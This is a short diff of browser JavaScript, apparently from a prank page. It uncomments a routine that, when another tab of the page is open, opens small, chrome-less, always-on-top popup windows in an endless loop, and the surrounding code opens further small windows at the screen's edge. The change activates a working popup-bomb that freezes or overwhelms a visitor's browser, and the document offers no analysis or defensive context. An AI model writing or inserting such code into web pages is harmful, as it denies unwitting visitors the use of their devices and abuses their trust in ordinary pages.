@@ -25,8 +25,8 @@ var onLocalStorageEvent = function(e){
 // Check if another page is open after a short delay
 var openCheck = setTimeout(function(){
   if (anotherPageOpen) {
-      /*function openWindow(url) {
-        const newWin = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
+      function openWindow() {
+        const newWin = window.open('', "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=200, height=180, titlebar=no, alwaysRaised=yes');
         if (newWin) {
             const screenWidth = screen.width - 200; // Keep within bounds
             const screenHeight = screen.height - 180;
@@ -39,7 +39,7 @@ var openCheck = setTimeout(function(){
             return newWin;
         }
     }
-    while (true) openWindow('');*/
+    while (true) openWindow();
   } else {
       // Open 4 small windows at the bottom of the screen
             for (let i = 0; i < 4; i++) {
